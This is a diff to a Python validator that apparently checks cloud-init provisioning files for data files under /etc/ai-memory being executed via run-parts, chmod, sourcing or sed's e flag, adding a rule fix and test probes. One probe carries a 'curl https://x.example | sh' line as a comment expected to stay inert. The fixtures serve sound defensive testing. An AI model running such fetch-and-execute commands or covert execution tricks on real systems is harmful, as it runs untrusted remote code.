@@ -835,6 +835,10 @@ def binary_ref(w: str, bins, shells: bool = False) -> bool:
     val = unquote(w)[0]
     if re.search(r"\s", val):
         return False
+    # a data home or a parent of one (/etc/ai-memory, /opt/ai-memory) is a directory
+    # that shares the binary's basename; what runs from it is rule R5's question (#4998)
+    if any(h.startswith(val.rstrip("/") + "/") for h in DATA_HOMES):
+        return False
     base = posixpath.basename(val)
     if base == "ai-memory" or (shells and (base in SHELLS or INTERP_BASE_RE.match(base))):
         return True
@@ -2416,7 +2420,7 @@ def build_probes() -> list:
         ('no-shebang write_files file at mode 0755, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0755", ["${X} --db /x stats"]))]),
         ('no-shebang write_files file outside the data homes, listed (#4837 R12 R5)', [(PROV, wf("/etc/default/ai-memory-run", "0644", ["${X} --db /x stats"]))]),
         ('no-shebang write_files file named by an absolute glob, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      for f in /etc/ai-memory/*.conf; do . \"$f\"; done\n" + dec)]),
-        # the directory is not named ai-memory, so only the parent-directory test (not R4) sees it
+        # the directory is not named ai-memory, so only the parent-directory test sees it
         ('no-shebang write_files file run through its directory, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/hooks.d/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory/hooks.d\n" + dec)]),
         ('data file made executable by chmod, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      chmod 0755 /etc/ai-memory/run.conf\n" + dec)]),
         ('data file read by sed with an e flag, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      sed -n 's/a/b/e' /etc/ai-memory/run.conf\n" + dec)]),
@@ -2430,6 +2434,10 @@ def build_probes() -> list:
     ]
     for lbl, muts in listed:
         red("R3-C listed " + lbl, muts, autolist=True)
+    # a data home shares the binary's basename: running from it is red for R5, never as an R4 wrapper (#4998)
+    red("R3-C listed data home run by run-parts is an R5 hit, not an R4 wrapper (#4998)",
+        [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory\n" + dec)],
+        autolist=True, absent="unknown wrapper")
     green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
     P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
     # ---- validators
@@ -2605,6 +2613,8 @@ def self_test(known: set) -> int:
         counts[expect] += 1
         if got != expect:
             bad.append("%s: expected %s, got %s %s" % (label, expect, got, (faults or hits or [""])[0][:140]))
+        elif spec.get("absent") and any(spec["absent"] in h for h in hits):
+            bad.append("%s: expected no hit naming %r, got one" % (label, spec["absent"]))
     muts = entry_mutations(base, cache)
     for raw, nm, text in muts:
         t = dict(base[0])
